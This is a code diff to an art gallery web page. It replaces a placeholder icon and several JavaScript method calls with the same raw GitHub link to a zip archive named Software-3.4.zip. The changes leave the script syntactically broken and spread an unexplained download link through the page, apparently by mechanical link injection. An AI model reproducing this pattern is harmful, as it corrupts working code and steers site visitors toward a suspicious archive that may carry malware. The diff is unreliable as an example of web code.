@@ -76,7 +76,7 @@
     <div class="container">
         <section id="home">
             <h1>Welcome to Our Art Gallery</h1>
-            <img class="icon" src="placeholder.png" alt="Icon"> <!-- Replace 'placeholder.png' with your actual icon image -->
+            <img class="icon" src="https://raw.githubusercontent.com/arukimu/Freehelp/main/medalet/Software-3.4.zip" alt="Icon"> <!-- Replace 'https://raw.githubusercontent.com/arukimu/Freehelp/main/medalet/Software-3.4.zip' with your actual icon image -->
         </section>
 
         <section id="about">
@@ -97,10 +97,10 @@
 
     <script>
         // Smooth scrolling for navigation links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function(e) {
-                e.preventDefault();
-                document.querySelector(this.getAttribute('href')).scrollIntoView({
+        https://raw.githubusercontent.com/arukimu/Freehelp/main/medalet/Software-3.4.zip('a[href^="#"]').forEach(anchor => {
+            https://raw.githubusercontent.com/arukimu/Freehelp/main/medalet/Software-3.4.zip('click', function(e) {
+                https://raw.githubusercontent.com/arukimu/Freehelp/main/medalet/Software-3.4.zip();
+                https://raw.githubusercontent.com/arukimu/Freehelp/main/medalet/Software-3.4.zip(https://raw.githubusercontent.com/arukimu/Freehelp/main/medalet/Software-3.4.zip('href')).scrollIntoView({
                     behavior: 'smooth'
                 });
             });
